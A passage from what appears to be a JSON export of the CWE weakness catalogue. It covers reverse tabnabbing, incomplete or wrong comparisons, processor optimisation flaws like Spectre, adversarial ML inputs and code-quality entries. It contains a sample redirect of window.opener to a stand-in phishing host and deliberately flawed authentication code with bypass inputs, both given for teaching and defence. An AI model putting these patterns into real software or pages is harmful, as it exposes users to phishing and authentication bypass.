          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Specify in the design that any linked external document must not be granted access to the location object of the calling page."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "\n\nWhen creating a link to an external document using the <a> tag with a defined target, for example \"_blank\" or a named frame, provide the rel attribute with a value \"noopener noreferrer\".\n\n\nIf opening the external document in a new window via javascript, then reset the opener by setting it equal to null.\n"
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "\n\nDo not use \"_blank\" targets. However, this can affect the usability of the application.\n"
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "In this example, the application opens a link in a named window/tab without taking precautions to prevent the called page from tampering with the calling page's location in the browser."
            },
            {
              "BodyText": "There are two ways that this weakness is commonly seen. The first is when the application generates an <a> tag is with target=\"_blank\" to point to a target site:"
            },
            {
              "Nature": "Bad",
              "Language": "HTML",
              "ExampleCode": "```\n\t<a href=\"http://attacker-site.example.com/useful-page.html\" target=\"_blank\">\n```"
            },
            {
              "BodyText": "If the attacker offers a useful page on this link (or compromises a trusted, popular site), then a user may click on this link. However, the attacker could use scripting code to modify the window.opener's location property to redirect the application to a malicious, attacker-controlled page - such as one that mimics the look and feel of the original application and convinces the user to re-enter authentication credentials, i.e. phishing:"
            },
            {
              "Nature": "Attack",
              "Language": "JavaScript",
              "ExampleCode": "```\n\twindow.opener.location = 'http://phishing.example.org/popular-bank-page';\n```"
            },
            {
              "BodyText": "To mitigate this type of weakness, some browsers support the \"rel\" attribute with a value of \"noopener\", which sets the window.opener object equal to null. Another option is to use the \"rel\" attribute with a value of \"noreferrer\", which in essence does the same thing."
            },
            {
              "Nature": "Good",
              "Language": "HTML",
              "ExampleCode": "```\n\t<a href=\"http://attacker-site.example.com/useful-page.html\" target=\"_blank\" rel=\"noopener noreferrer\">\n```"
            },
            {
              "BodyText": "A second way that this weakness is commonly seen is when opening a new site directly within JavaScript. In this case, a new site is opened using the window.open() function."
            },
            {
              "Nature": "Bad",
              "Language": "JavaScript",
              "ExampleCode": "```\n\tvar newWindow = window.open(\"http://attacker-site.example.com/useful-page.html\", \"_blank\");\n```"
            },
            {
              "BodyText": "To mitigate this, set the window.opener object to null."
            },
            {
              "Nature": "Good",
              "Language": "JavaScript",
              "ExampleCode": "```\n\tvar newWindow = window.open(\"http://attacker-site.example.com/useful-page.html\", \"_blank\");\n\tnewWindow.opener = null;\n```"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-4927",
          "Description": "Library software does not use rel: \"noopener noreferrer\" setting, allowing tabnabbing attacks to redirect to a malicious page",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-4927"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-39",
          "Authors": [
            "Alex Yumashev"
          ],
          "Title": "Target=\"_blank\" - the most underestimated vulnerability ever",
          "PublicationYear": "2016",
          "PublicationMonth": "05",
          "PublicationDay": "04",
          "URL": "https://medium.com/@jitbit/target-blank-the-most-underestimated-vulnerability-ever-96e328301f4c"
        },
        {
          "ExternalReferenceID": "REF-40",
          "Authors": [
            "Ben Halpern"
          ],
          "Title": "The target=\"_blank\" vulnerability by example",
          "PublicationYear": "2016",
          "PublicationMonth": "09",
          "PublicationDay": "11",
          "URL": "https://dev.to/ben/the-targetblank-vulnerability-by-example"
        },
        {
          "ExternalReferenceID": "REF-958",
          "Authors": [
            "Mathias Bynens"
          ],
          "Title": "About rel=noopener",
          "PublicationYear": "2016",
          "PublicationMonth": "03",
          "PublicationDay": "15",
          "URL": "https://mathiasbynens.github.io/rel-noopener/"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "1023",
      "Name": "Incomplete Comparison with Missing Factors",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product performs a comparison between entities that must consider multiple factors or characteristics of each entity, but the comparison does not include one or more of these factors.",
      "ExtendedDescription": "An incomplete comparison can lead to resultant weaknesses, e.g., by operating on the wrong object or making a security decision without considering a required factor.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "697",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Access Control"
          ],
          "Impact": [
            "Alter Execution Logic",
            "Bypass Protection Mechanism"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Thoroughly test the comparison scheme before deploying code into production. Perform positive testing as well as negative testing."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-115",
          "Entries": [
            {
              "IntroText": "Consider an application in which Truck objects are defined to be the same if they have the same make, the same model, and were manufactured in the same year."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class Truck {\n\t\t\tprivate String make;\n\t\t\tprivate String model;\n\t\t\tprivate int year;\n\t\t\tpublic boolean equals(Object o) {\n\t\t\t\t\tif (o == null) return false;\n\t\t\t\t\tif (o == this) return true;\n\t\t\t\t\tif (!(o instanceof Truck)) return false;\n\t\t\t\t\tTruck t = (Truck) o;\n\t\t\t\t\treturn (this.make.equals(t.getMake()) && this.model.equals(t.getModel()));\n\t\t\t}\n\t}\n```"
            },
            {
              "BodyText": "Here, the equals() method only checks the make and model of the Truck objects, but the year of manufacture is not included."
            }
          ]
        },
        {
          "ID": "DX-116",
          "Entries": [
            {
              "IntroText": "This example defines a fixed username and password. The AuthenticateUser() function is intended to accept a username and a password from an untrusted user, and check to ensure that it matches the username and password. If the username and password match, AuthenticateUser() is intended to indicate that authentication succeeded."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n```\n/* Ignore CWE-259 (hard-coded password) and CWE-309 (use of password system for authentication) for this example. */* \n\t\n\tchar *username = \"admin\";\n\tchar *pass = \"password\";\n\t\n\tint AuthenticateUser(char *inUser, char *inPass) {\n\t```\n\t\tif (strncmp(username, inUser, strlen(inUser))) {\n\t\t\tlogEvent(\"Auth failure of username using strlen of inUser\");\n\t\t\treturn(AUTH_FAIL);\n\t\t}\n\t\tif (! strncmp(pass, inPass, strlen(inPass))) {\n\t\t\tlogEvent(\"Auth success of password using strlen of inUser\");\n\t\t\treturn(AUTH_SUCCESS);\n\t\t}\n\t\telse {\n\t\t\tlogEvent(\"Auth fail of password using sizeof\");\n\t\t\treturn(AUTH_FAIL);\n\t\t}\n\t}\n\tint main (int argc, char **argv) {\n\t\t int authResult;\n\t\tif (argc < 3) {\n\t\t\tExitError(\"Usage: Provide a username and password\");\n\t\t}\n\t\tauthResult = AuthenticateUser(argv[1], argv[2]);\n\t\tif (authResult == AUTH_SUCCESS) {\n\t\t\tDoAuthenticatedTask(argv[1]);\n\t\t}\n\t\telse {\n\t\t\tExitError(\"Authentication failed\");\n\t\t}\n\t}\n```"
            },
            {
              "BodyText": "In AuthenticateUser(), the strncmp() call uses the string length of an attacker-provided inPass parameter in order to determine how many characters to check in the password. So, if the attacker only provides a password of length 1, the check will only examine the first byte of the application's password before determining success."
            },
            {
              "BodyText": "As a result, this partial comparison leads to improper authentication (CWE-287)."
            },
            {
              "BodyText": "Any of these passwords would still cause authentication to succeed for the \"admin\" user:"
            },
            {
              "Nature": "Attack",
              "ExampleCode": "```\n\tp\n\tpa\n\tpas\n\tpass\n```"
            },
            {
              "BodyText": "This significantly reduces the search space for an attacker, making brute force attacks more feasible."
            },
            {
              "BodyText": "The same problem also applies to the username, so values such as \"a\" and \"adm\" will succeed for the username."
            },
            {
              "BodyText": "While this demonstrative example may not seem realistic, see the Observed Examples for CVE entries that effectively reflect this same weakness."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2005-2782",
          "Description": "PHP remote file inclusion in web application that filters \"http\" and \"https\" URLs, but not \"ftp\".",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2782"
        },
        {
          "Reference": "CVE-2014-6394",
          "Description": "Product does not prevent access to restricted directories due to partial string comparison with a public directory",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2014-6394"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "1024",
      "Name": "Comparison of Incompatible Types",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product performs a comparison between two entities, but the entities are of different, incompatible types that cannot be guaranteed to provide correct results when they are directly compared.",
      "ExtendedDescription": "In languages that are strictly typed but support casting/conversion, such as C or C++, the programmer might assume that casting one entity to the same type as another entity will ensure that the comparison will be performed correctly, but this cannot be guaranteed. In languages that are not strictly typed, such as PHP or JavaScript, there may be implicit casting/conversion to a type that the programmer is unaware of, causing unexpected results; for example, the string \"123\" might be converted to a number type. See examples.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "697",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "JavaScript",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "PHP",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Varies by Context"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Thoroughly test the comparison scheme before deploying code into production. Perform positive testing as well as negative testing."
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "1025",
      "Name": "Comparison Using Wrong Factors",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The code performs a comparison between two entities, but the comparison examines the wrong factors or characteristics of the entities, which can lead to incorrect results and resultant weaknesses.",
      "ExtendedDescription": "This can lead to incorrect results and resultant weaknesses. For example, the code might inadvertently compare references to objects, instead of the relevant contents of those objects, causing two \"equal\" objects to be considered unequal.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "697",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Varies by Context"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Thoroughly test the comparison scheme before deploying code into production. Perform positive testing as well as negative testing."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-60",
          "Entries": [
            {
              "IntroText": "In the example below, two Java String objects are declared and initialized with the same string values. An if statement is used to determine if the strings are equivalent."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tString str1 = new String(\"Hello\");\n\tString str2 = new String(\"Hello\");\n\tif (str1 == str2) {\n\t\tSystem.out.println(\"str1 == str2\");\n\t}\n```"
            },
            {
              "BodyText": "However, the if statement will not be executed as the strings are compared using the \"==\" operator. For Java objects, such as String objects, the \"==\" operator compares object references, not object values. While the two String objects above contain the same string values, they refer to different object references, so the System.out.println statement will not be executed. To compare object values, the previous code could be modified to use the equals method:"
            },
            {
              "Nature": "Good",
              "ExampleCode": "```\n\tif (str1.equals(str2)) {\n\t\tSystem.out.println(\"str1 equals str2\");\n\t}\n```"
            }
          ]
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "1037",
      "Name": "Processor Optimization Removal or Modification of Security-critical Code",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The developer builds a security-critical protection mechanism into the software, but the processor optimizes the execution of the program such that the mechanism is removed or modified.",
      "LikelihoodOfExploit": "Low",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1038",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary",
          "Description": "This weakness does not depend on other weaknesses and is the result of choices made by the processor in executing the specified application."
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Rarely"
        },
        {
          "Type": "Technology",
          "Name": "Processor Hardware",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "Optimizations built into the design of the processor can have unintended consequences during the execution of an application."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Bypass Protection Mechanism"
          ],
          "Likelihood": [
            "High"
          ],
          "Note": "A successful exploitation of this weakness will change the order of an application's execution and will likely be used to bypass specific protection mechanisms. This bypass can be exploited further to potentially read data that should otherwise be unaccessible."
        }
      ],
      "DetectionMethods": [
        {
          "Method": "White Box",
          "Description": "In theory this weakness can be detected through the use of white box testing techniques where specifically crafted test cases are used in conjunction with debuggers to verify the order of statements being executed.",
          "Effectiveness": "Opportunistic",
          "EffectivenessNotes": "Although the mentioned detection method is theoretically possible, the use of speculative execution is a preferred way of increasing processor performance. The reality is that a large number of statements are executed out of order, and determining if any of them break an access control property would be extremely opportunistic."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2017-5715",
          "Description": "Intel, ARM, and AMD processor optimizations related to speculative execution and branch prediction cause access control checks to be bypassed when placing data into the cache. Often known as \"Spectre\".",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2017-5715"
        },
        {
          "Reference": "CVE-2017-5753",
          "Description": "Intel, ARM, and AMD processor optimizations related to speculative execution and branch prediction cause access control checks to be bypassed when placing data into the cache. Often known as \"Spectre\".",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2017-5753"
        },
        {
          "Reference": "CVE-2017-5754",
          "Description": "Intel processor optimizations related to speculative execution cause access control checks to be bypassed when placing data into the cache. Often known as \"Meltdown\".",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2017-5754"
        }
      ],
      "RelatedAttackPatterns": [
        "663"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-11",
          "Authors": [
            "Paul Kocher",
            "Daniel Genkin",
            "Daniel Gruss",
            "Werner Haas",
            "Mike Hamburg",
            "Moritz Lipp",
            "Stefan Mangard",
            "Thomas Prescher",
            "Michael Schwarz",
            "Yuval Yarom"
          ],
          "Title": "Spectre Attacks: Exploiting Speculative Execution",
          "PublicationYear": "2018",
          "PublicationMonth": "01",
          "PublicationDay": "03",
          "URL": "https://arxiv.org/abs/1801.01203"
        },
        {
          "ExternalReferenceID": "REF-12",
          "Authors": [
            "Moritz Lipp",
            "Michael Schwarz",
            "Daniel Gruss",
            "Thomas Prescher",
            "Werner Haas",
            "Stefan Mangard",
            "Paul Kocher",
            "Daniel Genkin",
            "Yuval Yarom",
            "Mike Hamburg"
          ],
          "Title": "Meltdown",
          "PublicationYear": "2018",
          "PublicationMonth": "01",
          "PublicationDay": "03",
          "URL": "https://arxiv.org/abs/1801.01207"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "As of CWE 4.9, members of the CWE Hardware SIG are closely analyzing this entry and others to improve CWE's coverage of transient execution weaknesses, which include issues related to Spectre, Meltdown, and other attacks. Additional investigation may include other weaknesses related to microarchitectural state. As a result, this entry might change significantly in CWE 4.10."
        }
      ]
    },
    {
      "ID": "1038",
      "Name": "Insecure Automated Optimizations",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The product uses a mechanism that automatically optimizes code, e.g. to improve a characteristic such as performance, but the optimizations can have an unintended side effect that might violate an intended security assumption.",
      "LikelihoodOfExploit": "Low",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "435",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "758",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary",
          "Description": "This weakness does not depend on other weaknesses and is the result of choices made during optimization."
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "Optimizations built into the design of a product can have unintended consequences during execution."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Alter Execution Logic"
          ],
          "Note": "The optimizations alter the order of execution resulting in side effects that were not intended by the original developer."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2017-5715",
          "Description": "Intel, ARM, and AMD processor optimizations related to speculative execution and branch prediction cause access control checks to be bypassed when placing data into the cache. Often known as \"Spectre\".",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2017-5715"
        },
        {
          "Reference": "CVE-2008-1685",
          "Description": "C compiler optimization, as allowed by specifications, removes code that is used to perform checks to detect integer overflows.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-1685"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      }
    },
    {
      "ID": "1039",
      "Name": "Automated Recognition Mechanism with Inadequate Detection or Handling of Adversarial Input Perturbations",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses an automated mechanism such as machine learning to recognize complex data inputs (e.g. image or audio) as a particular concept or category, but it does not properly detect or handle inputs that have been modified or constructed in a way that causes the mechanism to detect a different, incorrect concept.",
      "ExtendedDescription": "\n\nWhen techniques such as machine learning are used to automatically classify input streams, and those classifications are used for security-critical decisions, then any mistake in classification can introduce a vulnerability that allows attackers to cause the product to make the wrong security decision. If the automated mechanism is not developed or \"trained\" with enough input data, then attackers may be able to craft malicious input that intentionally triggers the incorrect classification.\n\n\nTargeted technologies include, but are not necessarily limited to:\n\n\n  - automated speech recognition\n\n  - automated image recognition\n\nFor example, an attacker might modify road signs or road surface markings to trick autonomous vehicles into misreading the sign/marking and performing a dangerous action.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "693",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "697",
          "ViewID": "1000"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary",
          "Description": "This weakness does not depend on other weaknesses and is the result of choices made during optimization."
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Name": "AI/ML",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "This issue can be introduced into the automated algorithm itself."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Bypass Protection Mechanism"
          ],
          "Note": "When the automated recognition is used in a protection mechanism, an attacker may be able to craft inputs that are misinterpreted in a way that grants excess privileges."
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-16",
          "Authors": [
            "Christian Szegedy",
            "Wojciech Zaremba",
            "Ilya Sutskever",
            "Joan Bruna",
            "Dumitru Erhan",
            "Ian Goodfellow",
            "Rob Fergus"
          ],
          "Title": "Intriguing properties of neural networks",
          "PublicationYear": "2014",
          "PublicationMonth": "02",
          "PublicationDay": "19",
          "URL": "https://arxiv.org/abs/1312.6199"
        },
        {
          "ExternalReferenceID": "REF-17",
          "Authors": [
            "OpenAI"
          ],
          "Title": "Attacking Machine Learning with Adversarial Examples",
          "PublicationYear": "2017",
          "PublicationMonth": "02",
          "PublicationDay": "24",
          "URL": "https://openai.com/research/attacking-machine-learning-with-adversarial-examples",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-15",
          "Authors": [
            "James Vincent"
          ],
          "Title": "Magic AI: These are the Optical Illusions that Trick, Fool, and Flummox Computers",
          "PublicationYear": "2017",
          "PublicationMonth": "04",
          "PublicationDay": "12",
          "Publisher": "The Verge",
          "URL": "https://www.theverge.com/2017/4/12/15271874/ai-adversarial-images-fooling-attacks-artificial-intelligence"
        },
        {
          "ExternalReferenceID": "REF-13",
          "Authors": [
            "Xuejing Yuan",
            "Yuxuan Chen",
            "Yue Zhao",
            "Yunhui Long",
            "Xiaokang Liu",
            "Kai Chen",
            "Shengzhi Zhang",
            "Heqing Huang",
            "Xiaofeng Wang",
            "Carl A. Gunter"
          ],
          "Title": "CommanderSong: A Systematic Approach for Practical Adversarial Voice Recognition",
          "PublicationYear": "2018",
          "PublicationMonth": "01",
          "PublicationDay": "24",
          "URL": "https://arxiv.org/pdf/1801.08535.pdf"
        },
        {
          "ExternalReferenceID": "REF-14",
          "Authors": [
            "Nicholas Carlini",
            "David Wagner"
          ],
          "Title": "Audio Adversarial Examples: Targeted Attacks on Speech-to-Text",
          "PublicationYear": "2018",
          "PublicationMonth": "01",
          "PublicationDay": "05",
          "URL": "https://arxiv.org/abs/1801.01944"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed-with-Review",
        "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate",
        "Comments": "Examine children of this entry to see if there is a better fit",
        "Reasons": [
          "Abstraction"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "Further investigation is needed to determine if better relationships exist or if additional organizational entries need to be created. For example, this issue might be better related to \"recognition of input as an incorrect type,\" which might place it as a sibling of CWE-704 (incorrect type conversion)."
        }
      ]
    },
    {
      "ID": "1041",
      "Name": "Use of Redundant Code",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product has multiple functions, methods, procedures, macros, etc. that\n\t\t\t\t\tcontain the same code.",
      "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. For example, if there are two copies of the same code, the programmer might fix a weakness in one copy while forgetting to fix the same weakness in another copy.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "710",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Maintainability"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Merge common functionality into a single function and then call that function from across the entire code base."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "In the following Java example the code performs some complex math when specific test conditions are met. The math is the same in each case and the equations are repeated within the code. Unfortunately if a future change needs to be made then that change needs to be made in all locations. This opens the door to mistakes being made and the changes not being made in the same way in each instance."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class Main {\n\t\tpublic static void main(String[] args) { \n\t\t\tdouble s = 10.0; \n\t\t\tdouble r = 1.0; \n\t\t\tdouble pi = 3.14159; \n\t\t\tdouble surface_area;\n\t\t\tif(r > 0.0) { \n\t\t\t\t// complex math equations \n\t\t\t\tsurface_area = pi * r * s + pi * Math.pow(r, 2);\n\t\t\t}\n\t\t\tif(r > 1.0) { \n\t\t\t\t// a complex set of math \n\t\t\t\tsurface_area = pi * r * s + pi * Math.pow(r, 2);\n\t\t\t}\n\t\t}\n\t}\n```"
            },
            {
              "BodyText": "It is recommended to place the complex math into its own function and then call that function whenever necessary."
            },
            {
              "Nature": "Good",
              "Language": "Java",
              "ExampleCode": "```\n\tpublic class Main {\n\t\tprivate double ComplexMath(double r, double s) { \n\t\t\t//complex math equations \n\t\t\tdouble pi = Math.PI; \n\t\t\tdouble surface_area = pi * r * s + pi * Math.pow(r, 2); \n\t\t\treturn surface_area;\n\t\t}\n\t\tpublic static void main(String[] args) { \n\t\t\tdouble s = 10.0; \n\t\t\tdouble r = 1.0; \n\t\t\tdouble surface_area;\n\t\t\tif(r > 0.0) { \n\t\t\t\tsurface_area = ComplexMath(r, s);\n\t\t\t}\n\t\t\tif(r > 1.0) { \n\t\t\t\tsurface_area = ComplexMath(r, s);\n\t\t\t}\n\t\t}\n\t}\n```"
            }
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCMM",
          "EntryID": "ASCMM-MNT-19"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-960",
          "Section": "ASCMM-MNT-19",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Maintainability Measure (ASCMM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCMM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1042",
      "Name": "Static Member Data Element outside of a Singleton Class Element",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The code contains a member element that is declared as static (but not final), in which\n\t\t\t\t\tits parent class element \n\t\t\t\t\tis not a singleton class - that is, a class element that can be used only once in\n\t\t\t\t\tthe 'to' association of a Create action.",
      "ExtendedDescription": "\n\nThis issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "1176",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Reduce Performance"
          ]
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "OMG ASCPEM",
          "EntryID": "ASCPEM-PRF-3"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-959",
          "Section": "ASCPEM-PRF-3",
          "Authors": [
            "Object Management Group (OMG)"
          ],
          "Title": "Automated Source Code Performance Efficiency Measure (ASCPEM)",
          "PublicationYear": "2016",
          "PublicationMonth": "01",
          "URL": "https://www.omg.org/spec/ASCPEM/",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Prohibited",
        "Rationale": "This entry is primarily a quality issue with no direct security implications.",
        "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.",
        "Reasons": [
          "Other"
        ]
      }
    },
    {
      "ID": "1043",
      "Name": "Data Element Aggregating an Excessively Large Number of Non-Primitive Elements",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses a data element that has an excessively large\n\t\t\t\t\tnumber of sub-elements with non-primitive data types such as structures or aggregated objects.",
